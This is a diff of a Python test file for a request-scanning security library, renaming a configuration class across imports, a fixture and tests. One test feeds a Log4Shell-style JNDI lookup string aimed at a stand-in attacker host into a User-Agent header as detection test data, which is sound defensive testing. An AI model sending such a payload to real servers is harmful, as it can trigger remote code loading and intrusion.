@@ -12,7 +12,7 @@ from urllib.parse import urlencode
 
 import pytest
 
-from guard_core.models import SecurityConfig
+from guard_core.models import SyncSecurityConfig
 from guard_core.sync.handlers.suspatterns_handler import (
     CATEGORY_CONTEXT_MAP,
     sus_patterns_handler,
@@ -35,12 +35,12 @@ from tests.test_sus_patterns.test_detection_benchmark import (
 )
 from tests.test_sync.conftest import SyncMockGuardRequest, declare_route
 
-_CONFIG = SecurityConfig()
+_CONFIG = SyncSecurityConfig()
 
 
 @pytest.fixture(autouse=True)
 def _force_enhanced_detection_singleton() -> Iterator[None]:
-    sus_patterns_handler.configure(SecurityConfig())
+    sus_patterns_handler.configure(SyncSecurityConfig())
     yield
 
 
@@ -1410,7 +1410,7 @@ def test_byte_sensitive_deserialization_detected_via_every_mechanism() -> None:
 
 
 def test_always_scan_header_shield_honors_disabled_cmd_injection_category() -> None:
-    disabled_config = SecurityConfig(enabled_detection_categories={"xss"})
+    disabled_config = SyncSecurityConfig(enabled_detection_categories={"xss"})
     request = _user_agent_header_request("${jndi:ldap://evil.example/a}")
 
     result = detect_penetration_attempt(request, disabled_config)
